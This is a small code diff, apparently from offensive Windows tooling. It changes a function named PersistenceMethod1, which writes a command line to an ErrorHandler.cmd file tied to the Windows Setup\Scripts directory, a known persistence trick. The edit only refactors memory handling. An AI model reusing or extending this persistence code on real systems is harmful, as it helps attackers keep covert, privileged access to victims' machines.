@@ -292,7 +292,7 @@ BOOL PersistenceMethod1
 
 	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
 	SecureZeroMemory(OldPath, sizeof(OldPath));
-	GenerateTempPathW(L"ErrorHandler.cmd", NULL, NULL, &lpTempPath);
+	lpTempPath = GenerateTempPathW(L"ErrorHandler.cmd", NULL, NULL);
 	GetWindowsDirectoryW(wszWindowsPath, _countof(wszWindowsPath));
 	lstrcatW(wszWindowsPath, L"\\Setup\\Scripts");
 	if (!WriteToFile(lpTempPath, lpCommandLine, lstrlenA(lpCommandLine))) {
@@ -318,9 +318,6 @@ CLEANUP:
 		DeleteFileW(lpTempPath);
 	}
 
-	if (lpTempPath != NULL) {
-		FREE(lpTempPath);
-	}
-
+	FREE(lpTempPath);
 	return Result;
 }
